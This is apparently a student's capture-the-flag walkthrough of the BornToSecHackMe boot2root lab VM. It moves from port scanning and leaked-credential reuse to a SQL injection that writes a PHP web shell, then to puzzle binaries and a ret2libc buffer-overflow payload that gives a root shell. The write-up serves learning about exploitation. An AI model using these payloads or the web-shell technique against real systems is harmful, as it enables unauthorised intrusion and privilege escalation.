# Write Up 1

## Init
Installation of a Parrot Security ISO
>[Parrot](https://www.parrotsec.org/download/_)

We have to use some tools during the process so we use a VM with already some tools installed.

## Enumerate
To start, we need to list all the services which run on the machine.

First, use `nmap` to list active ports and the correspondants services.

```
➜  boot2root git:(main) nmap -sV 192.168.56.105
Not shown: 994 closed ports
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
143/tcp open  imap       Dovecot imapd
443/tcp open  ssl/http   Apache httpd 2.2.22
993/tcp open  ssl/imaps?
```
We can see there is a `http server` who runs on port `443`

![image](https://github.com/JoLMG42/boot2root/assets/94530285/a6a099ac-39a0-4ee4-bd7d-5a0131762458)

We can use `dirb` on Parrot examine roads of the server

```
┌─[user@parrot]─[~]
└──╼ $dirb https://192.168.56.101
 ==> DIRECTORY: https://192.168.56.101/forum/
 ==> DIRECTORY: https://192.168.56.101/phpmyadmin/
 ==> DIRECTORY: https://192.168.56.101/webmail/
```

## WEB
When we try to access `phpmyadmin` and `webmail`, we need a `login` and a `password`, so go on forum for the moment.

![image](https://github.com/JoLMG42/boot2root/assets/94530285/f0a3b0d2-f0a2-43de-aa4d-e5ba1f7c90e3)

We see a `post` about `Probleme login ?` by a user named lmezard

In this post we found a log about a connection to a service and we found a password of lmezard.

```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```

So try to login on the forum with these logs:
>login: `lmezard` password: `!q\]Ej?*5K5cy*AJ`

Youhou we are connected.

Now, we find an email in the informations section of lmezard,

![image](https://github.com/JoLMG42/boot2root/assets/94530285/d683c07d-224b-489d-a523-c678d4c3074d)

So go on the webmail service, try to log with our logs:

>login: `laurie@borntosec.net` password: `!q\]Ej?*5K5cy*AJ`

In the receive mail section, we have this mail,

![image](https://github.com/JoLMG42/boot2root/assets/94530285/c7bf327c-9d7a-4eee-84c2-3856d628b92a)

So go on phpmyadmin,

>login: `root` password: `Fg-'kKXBj87E:aJ$`

Now we have access to the database and we have a SQL page where we can send sql injections:

https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/

![image](https://github.com/JoLMG42/boot2root/assets/94530285/5b4d943c-0e27-4cbf-8198-715e9ab78d36)

>sqli: `SELECT 1, '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/forum/templates_c/cmd.php' #`


Now if we target this url: `https://192.168.56.101/forum/templates_c/cmd.php?cmd=`, we can execute every commands on the machine

If we execute `ls /home` we can see a directory named LOOKATME,

![image](https://github.com/JoLMG42/boot2root/assets/94530285/f223cbe0-2207-466e-ae17-5bd8896d4015)

After dig in, we found a file password, lets cat it,

>https://192.168.56.101/forum/templates_c/cmd.php?cmd=cat%20/home/LOOKATME/password

>login: `lmezard` password `G!@M6f4Eatau{sF"`

## FTP
After try some service with these logs, we found we can connect to FTP with it and we see two files, lets get it,


```
➜  ~ ftp lmezard@192.168.56.101
Connected to 192.168.56.101.
220 Welcome on this server
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||61451|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get README
local: README remote: README
229 Entering Extended Passive Mode (|||14650|).
150 Opening BINARY mode data connection for README (96 bytes).
100% |***************************************************************************|    96      118.52 KiB/s    00:00 ETA
226 Transfer complete.
96 bytes received in 00:00 (56.03 KiB/s)
ftp> get fun
local: fun remote: fun
229 Entering Extended Passive Mode (|||53956|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |***************************************************************************|   790 KiB   26.64 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (25.62 MiB/s)
```

The README file says: `Complete this little challenge and use the result as password for user 'laurie' to login in ssh`.

So we have file fun:
1. examine informations about the file:
   ```
   ➜  ~ file fun
   fun: POSIX tar archive (GNU)
   ```
2. extract files:
   ```
   ➜  ~ tar -xvf fun
   ft_fun/
   ft_fun/C4D03.pcap
   ft_fun/GKGEP.pcap
   ft_fun/A5GPY.pcap
   ft_fun/K8SEB.pcap
   ft_fun/PFG98.pcap
   ...
   ...
   ```
3. from here we can inspect all files and we've found something which looks like a password but incomplete

   ![Screenshot at 2024-02-21 09-03-00](https://github.com/JoLMG42/boot2root/assets/96475943/0c71563c-b3c3-4744-b95a-4f04ab97c279)

4. Next we want to get all `getme` function and all `return` asociated to each
   ```
   We have for last 5 getme, a fonction in the same file so the last 5 caracters are probably "wnage"
   ```
5. For all other `getme` we search `return` keyword in the folder and found `seven` other caracters so we have everything now we just need to find the order
   
   ![Screenshot at 2024-02-21 09-09-07](https://github.com/JoLMG42/boot2root/assets/96475943/a7f35a09-c673-49fb-b9af-dd125a9aefef)

6. There is one upppercase later, `I` so we conclude that the password is a like sentence with existing words so we try some combinations and finish with three possible passsword, `Iheartpwnage`, `Ihaterpwnage` and `Iearthpwnage`.
7. We try to connect to thor with the first one so in `SHA-256` with `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
   ```
   └──╼ $ssh laurie@192.168.56.109
   The authenticity of host '192.168.56.109 (192.168.56.109)' can't be established.
   ECDSA key fingerprint is SHA256:d5T03f+nYmKY3NWZAinFBqIMEK1U0if222A1JeR8lYE.
   This key is not known by any other names.
   Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
   Warning: Permanently added '192.168.56.109' (ECDSA) to the list of known hosts.
           ____                _______    _____           
          |  _ \              |__   __|  / ____|          
          | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
          |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
          | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
          |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
   
                          Good luck & Have fun
   laurie@192.168.56.109's password: 
   laurie@BornToSecHackMe:~$
   ```
   
It's good !

## SSH USER LAURIE - THE BOMB

Now we are in the machine, lets see what we have access to

```
laurie@BornToSecHackMe:~$ ls -l
total 27
-rwxr-x--- 1 laurie laurie 26943 Oct  8  2015 bomb
-rwxr-x--- 1 laurie laurie   158 Oct  8  2015 README
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

So we have a binary file, `bomb` that can be diffused and probably all text to diffused it is a part of the password, so lets get it.

We start with using `scp` to extract the file and decompile it.

```
┌─[user@parrot]─[~]
└──╼ $scp laurie@192.168.56.109:bomb .
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.109's password: 

Permission denied, please try again.
laurie@192.168.56.109's password: 
bomb                                          100%   26KB   7.1MB/s   00:00
```

We can check the main

```
int main(int argc, const char **argv, const char **envp)
{
  _BYTE *line; // eax
  char *v4; // eax
  char *v5; // eax
  char *v6; // eax
  _BYTE *v7; // eax
  char *v8; // eax

  if ( argc == 1 )
  {
    infile = (_IO_FILE *)stdin;
  }
  else
  {
    if ( argc != 2 )
    {
      printf("Usage: %s [<input_file>]\n", *argv);
      exit(8);
    }
    infile = fopen(argv[1], "r");
    if ( !infile )
    {
      printf("%s: Error: Couldn't open %s\n", *argv, argv[1]);
      exit(8);
    }
  }
  initialize_bomb();
  printf("Welcome this is my little bomb !!!! You have 6 stages with\n");
  printf("only one life good luck !! Have a nice day!\n");
  line = (_BYTE *)read_line();
  phase_1(line);
  phase_defused();
  printf("Phase 1 defused. How about the next one?\n");
  v4 = (char *)read_line();
  phase_2(v4);
  phase_defused();
  printf("That's number 2.  Keep going!\n");
  v5 = (char *)read_line();
  phase_3(v5);
  phase_defused();
  printf("Halfway there!\n");
  v6 = (char *)read_line();
  phase_4(v6);
  phase_defused();
  printf("So you got that one.  Try this one.\n");
  v7 = (_BYTE *)read_line();
  phase_5(v7);
  phase_defused();
  printf("Good work!  On to the next...\n");
  v8 = (char *)read_line();
  phase_6(v8);
  phase_defused();
  return 0;
}
```

So we have a program that take a file in arguments and we have `6` stage to disarm. Go for it !

### PHASE 1

```
int phase_1(_BYTE *a1)
{
  int result; // eax

  result = strings_not_equal(a1, "Public speaking is very easy.");
  if ( result )
    explode_bomb();
  return result;
}
```

The first phase is just a strcmp between our input and `Public speaking is very easy.` so we just need to  copy this line and send it

> 1 - `Public speaking is very easy.`

### PHASE 2

```
int phase_2(char *s)
{
  int i; // ebx
  int result; // eax
  int v3[6]; // [esp+10h] [ebp-18h] BYREF

  read_six_numbers(s, (int)v3);
  if ( v3[0] != 1 )
    explode_bomb();
  for ( i = 1; i <= 5; ++i )
  {
    result = v3[i - 1] * (i + 1);
    if ( v3[i] != result )
      explode_bomb();
  }
  return result;
}
```

The second phase take six numbers in arguments and check some things.

The `first argument` has to be `1`

All next one has to be `previous * (index + 1)` so we have our sequence.

> 2 - `1 2 6 24 120 720`

### PHASE 3

```
void phase_3(char *param_1)

{
  int iVar1;
  char cVar2;
  uint local_10;
  char local_9;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);
  if (iVar1 < 3) {
    explode_bomb();
  }
  switch(local_10) {
  case 0:
    cVar2 = 'q';
    if (local_8 != 0x309) {
      explode_bomb();
    }
    break;
  case 1:
    cVar2 = 'b';
    if (local_8 != 0xd6) {
      explode_bomb();
    }
    break;
  case 2:
    cVar2 = 'b';
    if (local_8 != 0x2f3) {
      explode_bomb();
    }
    break;
  case 3:
    cVar2 = 'k';
    if (local_8 != 0xfb) {
      explode_bomb();
    }
    break;
  case 4:
    cVar2 = 'o';
    if (local_8 != 0xa0) {
      explode_bomb();
    }
    break;
  case 5:
    cVar2 = 't';
    if (local_8 != 0x1ca) {
      explode_bomb();
    }
    break;
  case 6:
    cVar2 = 'v';
    if (local_8 != 0x30c) {
      explode_bomb();
    }
    break;
  case 7:
    cVar2 = 'b';
    if (local_8 != 0x20c) {
      explode_bomb();
    }
    break;
  default:
    cVar2 = 'x';
    explode_bomb();
  }
  if (cVar2 != local_9) {
    explode_bomb();
  }
  return;
}
```

In the `third phase` the input take `one integer`, `one caractere` and `one integer` here, each switch block is a solution but from the `HINT` in the `README` we know that the caracters is `b` so we have `three` possibility. We going to take the first one.

> 3- `1 b 214`

### PHASE 4

```
int func4(int param_1)
{
  int iVar1;
  int iVar2;
  
  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}

void phase_4(char *param_1)
{
  int iVar1;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d",&local_8);
  if ((iVar1 != 1) || (local_8 < 1)) {
    explode_bomb();
  }
  iVar1 = func4(local_8);
  if (iVar1 != 0x37) {
    explode_bomb();
  }
  return;
}
```

In this one the input take `one integer` and pass it to the recursive function `func4` and check if the return of `func4`  is `55`.

We know that `func4` is a fibonacci function `55` is the `9` element of this sequence so we pass it here.

> 4- `9`

### PHASE 5

```
_BYTE array_123[16] = { 105, 115, 114, 118, 101, 97, 119, 104, 111, 98, 112, 110, 117, 116, 102, 103 };

void phase_5(int param_1)
{
  int iVar1;
  undefined local_c [6];
  undefined local_6;
  
  iVar1 = string_length(param_1);
  if (iVar1 != 6) {
    explode_bomb();
  }
  iVar1 = 0;
  do {
    local_c[iVar1] = (&array_123)[(char)(*(byte *)(iVar1 + param_1) & 0xf)];
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  local_6 = 0;
  iVar1 = strings_not_equal(local_c,"giants");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}
```
Here we have a function which need a string of `six caracters long` and after give each caractere in the `array_123` line se need to get the word `giants`.

We can convert each entry of the array in ascii

```
char array_123[16] = { i, s, r, v, e, a, w, h, o, b, p, n, u, t, f, g };
```

Now for each caractere, the `binary` operation `& 0xf` is applied so we need to puts caracteres where in `hex` end with index of `searched` caracters. If in first we need a `i`, we have to pass something `which end with 0`, if we want a `g`, something `which end with f`.

So we want the words giants so the input which can work is `o(0x6f), p(0x70), e(0x65), k(0x6b), m(0x6d), q(0x71)`.

> 5- `opekmq`

### PHASE 6

```
int __cdecl phase_6(char *s)
{
  int i; // edi
  int j; // ebx
  int k; // edi
  _DWORD *v4; // esi
  int m; // ebx
  int v6; // esi
  int n; // edi
  int v8; // eax
  int v9; // esi
  int ii; // edi
  int result; // eax
  int v12; // [esp+24h] [ebp-34h]
  int v13[6]; // [esp+28h] [ebp-30h]
  int v14[6]; // [esp+40h] [ebp-18h] BYREF

  read_six_numbers(s, (int)v14);
  for ( i = 0; i <= 5; ++i )
  {
    if ( (unsigned int)(v14[i] - 1) > 5 )
      explode_bomb();
    for ( j = i + 1; j <= 5; ++j )
    {
      if ( v14[i] == v14[j] )
        explode_bomb();
    }
  }
  for ( k = 0; k <= 5; ++k )
  {
    v4 = &node1;
    for ( m = 1; m < v14[k]; ++m )
      v4 = (_DWORD *)v4[2];
    v13[k] = (int)v4;
  }
  v6 = v13[0];
  v12 = v13[0];
  for ( n = 1; n <= 5; ++n )
  {
    v8 = v13[n];
    *(_DWORD *)(v6 + 8) = v8;
    v6 = v8;
  }
  *(_DWORD *)(v8 + 8) = 0;
  v9 = v12;
  for ( ii = 0; ii <= 4; ++ii )
  {
    result = *(_DWORD *)v9;
    if ( *(_DWORD *)v9 < **(_DWORD **)(v9 + 8) )
      explode_bomb();
    v9 = *(_DWORD *)(v9 + 8);
  }
  return result;
}
```

For the last phase, we have this big function which take `six integers as arguments`. The `two` first loop check if all inputs are lower or egal than `6` and if there are no duplicates. Next there is a chained list where each node contains an integer. At the end the function check if all node are sorted in the ascending order.

So we have

```
Whit inout "1 2 3 4 5 6"
Node1 = 0xfd
Node2 = 0x2d5
Node3 = 0x12d
Node4 = 0x3e5
Node5 = 0xd4
Node6 = 0x1b0
```
So we have the order `5 1 3 6 2 4` we invert it and we have `4 2 6 3 1 5`

> 6- `4 2 6 3 1 5`

### END

So we have everything we test it

```
laurie@BornToSecHackMe:~$ cat soluce.txt 
Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekmq
4 2 6 3 1 5

laurie@BornToSecHackMe:~$ ./bomb soluce.txt 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
Congratulations! You've defused the bomb!
```

Everything together without space give `Publicspeakingisveryeasy.126241207201b2149opekmq426315`. But this doesn't work, for no reason we need to invert `3` and `1` in the last input so we have `Publicspeakingisveryeasy.126241207201b2149opekmq426135`.

```
laurie@BornToSecHackMe:~$ su thor
Password: 
thor@BornToSecHackMe:~$ 
```

## SSH USER THOR - TURTLE

For the next user we inspect the current directory

```
thor@BornToSecHackMe:~$ ls -l
total 32
-rwxr-x--- 1 thor thor    69 Oct  8  2015 README
-rwxr-x--- 1 thor thor 31523 Oct  8  2015 turtle
thor@BornToSecHackMe:~$ cat README
Finish this challenge and use the result as password for 'zaz' user.
```

Turtle is a `python` librairy used to draw so things on a screen with simple instruction like forward(x), rotate(x) or backward(x).

In the file `turtle` we have a bunch of instructions

```
Tourne gauche de 90 degrees
Avance 50 spaces
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
...
...
Tourne droite de 90 degrees
Avance 100 spaces
Recule 200 spaces

Can you digest the message? :)
```

So we going to write a little program with turtle that can read and do all these instructions.

```
from turtle import *

f = open("turtle", "r")

l = f.readlines()
t = Turtle()
i = 0
color = ['red', 'blue', 'green', 'orange']
for line in l:
	line = line.split()
	if len(line) ==	0:
		t.color(color[i])
  i = (i+1)%4
		continue
	elif line[0] == "Avance":
		t.forward(int(line[1]))
	elif line[0] == "Recule":
		t.backward(int(line[1]))
	elif line[0] == "Tourne":
		if line[1] == "droite":
			t.right(int(line[3]))
		else:
			t.left(int(line[3]))	
	else:
		continue

t.screen.mainloop()
```
That beautifule drawing of letters in the order (black, red, blue, green, orange)

![Screenshot at 2024-02-21 11-02-41](https://github.com/JoLMG42/boot2root/assets/96475943/af3875f4-fd15-46c4-839c-8796a7ce2991)

So we have the word `SLASH`. We encrypt it in `MD5` and we have `646da671ca01bb5d84dbb5fb2238dc8e`

We try it

```
thor@BornToSecHackMe:~$ su zaz
Password: 
zaz@BornToSecHackMe:~$
```

## SSH USER ZAZ - BINARY EXPLOIT

For this user we inspect what we have in the current folder

```
zaz@BornToSecHackMe:~$ ls -l
total 5
-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
```

We have an executable which run with `root` right. 

We use `gdb` to analyse it

```
(gdb) disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   %ebp
   0x080483f5 <+1>:	mov    %esp,%ebp
   0x080483f7 <+3>:	and    $0xfffffff0,%esp
   0x080483fa <+6>:	sub    $0x90,%esp
   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    $0x1,%eax
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    0xc(%ebp),%eax
   0x08048410 <+28>:	add    $0x4,%eax
   0x08048413 <+31>:	mov    (%eax),%eax
   0x08048415 <+33>:	mov    %eax,0x4(%esp)
   0x08048419 <+37>:	lea    0x10(%esp),%eax
   0x0804841d <+41>:	mov    %eax,(%esp)
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    0x10(%esp),%eax
   0x08048429 <+53>:	mov    %eax,(%esp)
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    $0x0,%eax
   0x08048436 <+66>:	leave  
   0x08048437 <+67>:	ret    
End of assembler dump.
```

we have a `strcpy` which is vulnerable so we try to inject more than (0x90 - 0x10 == 128) caracteres to find `eip` address

```
(gdb) run $(python -c "print'a'*128+'ABCDEFGHIJKLMNOPQRSTUVWXYZ'")
Starting program: /home/zaz/exploit_me $(python -c "print'a'*128+'ABCDEFGHIJKLMNOPQRSTUVWXYZ'")
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaABCDEFGHIJKLMNOPQRSTUVWXYZ

Program received signal SIGSEGV, Segmentation fault.
0x504f4e4d in ?? ()
```

`4d` in ascii is `M` so  eip is after `140` caracteres.

We can do a `Ret2libc` exploit so we need the address of `system` and the address of `/bin/sh`

```
(gdb) info func system
All functions matching regular expression "system":

Non-debugging symbols:
0xb7e6b060  __libc_system
0xb7e6b060  system
0xb7f49550  svcerr_systemerr
(gdb) find __libc_start_main, +9999999, "/bin/sh"
0xb7f8cc58
```

Now we cna write our payload

```
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c "print'a'*140+'\x60\xb0\xe6\xb7' + 'qqqq' + '\x58\xcc\xf8\xb7'")
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`��qqqqX���
# whoami 
root
```
We are ROOT !
